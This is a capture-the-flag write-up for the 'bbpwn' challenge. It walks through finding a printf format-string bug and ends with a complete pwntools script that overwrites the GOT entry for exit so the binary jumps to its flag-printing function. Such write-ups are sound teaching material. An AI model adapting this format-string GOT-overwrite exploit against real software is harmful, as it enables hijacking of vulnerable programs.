# bbpwn (pwn)  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/f080b407-37df-4d1b-97ab-aa0783508e4e)  

Something to take into account is that there is `Partial RELRO`. This means that the `GOT` is writable, which we will abuse in this challenge.  

Let's run the binary  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/6c9dcd0c-9ff6-46bb-8391-fd0c04c1ab24)  

Everytime you see your input reflected, you need to think about `printf` vulnerabilities.  
To quickly test for them, try sending `%x` as input.  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/49836c54-dca9-48ae-bcf8-7d4b14a2321f)  
As you can see, we are leaking values from the stack.  
I won't go into detail on why these vulnerabilities exist, but if interested read [this](https://ir0nstone.gitbook.io/notes/types/stack/format-string)  

## exploitation  
Pwntools has a very handy `fmtstr_payload` function that we can use to generate format string vulnerability payloads.  
It needs 3 parameters:
##### offset  
the offset of the first formatter we control
we can figure this out by sending something like this:  
`AAAA 1:%x 2:%x 3:%x 4:%x 5:%x 6:%x 7:%x 8:%x 9:%x 10:%x 11:%x 12:%x 13:%x 14:%x 15:%x 16:%x 17:%x 18:%x 19:%x 20:%x 21:%x 22:%x 23:%x 24:%x 25:%x 26:%x 27:%x 28:%x 29:%x 30:%x`
Which I generated using a simple python script.
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/831722b4-f35b-49d4-9279-4cd6513df358)

Notice that offset 10 contains our input, therefore `offset` = 10

##### writes  
a dictionary of the addresses and values to write.  

Let's look at ghidra quickly:  
```c
void main(undefined4 param_1,undefined4 param_2)

{
  int in_GS_OFFSET;
  char local_208 [200];
  char local_140 [300];
  undefined4 local_14;
  undefined *puStack_c;
  
  puStack_c = (undefined *)&param_1;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  puts("Hello baby pwner, whats your name?");
  fflush(stdout);
  fgets(local_208,200,stdin);
  fflush(stdin);
  sprintf(local_140,"Ok cool, soon we will know whether you pwned it or not. Till then Bye %s",
          local_208);
  fflush(stdout);
  printf(local_140);
  fflush(stdout);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
Notice that `exit` is being called at the end. Also there is a `flag` function that calls `system("cat flag.txt")`.  
Since `Partial RELRO` is enabled, we can overwrite the GOT entry for `exit` with the address of the `flag` function, so that when `exit` is called, the `flag` function is the one actually called.  

##### numbwritten  
how many bytes are written previous to our input.  
We can manually determine that we are printing 70 bytes before our input.

Therefore putting it all together we have:  
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template 32_new
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '32_new')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

first_controlled = 10
numwritten = 70
writes = {exe.got['exit']: exe.sym['_Z4flagv']}

# pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') â†’ str[source]
payload = fmtstr_payload(first_controlled, writes, numbwritten = numwritten)
log.info(len(payload))

io.sendline(payload)

io.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/57d8cc96-d5fd-4c9f-b571-2f47baecc81b)
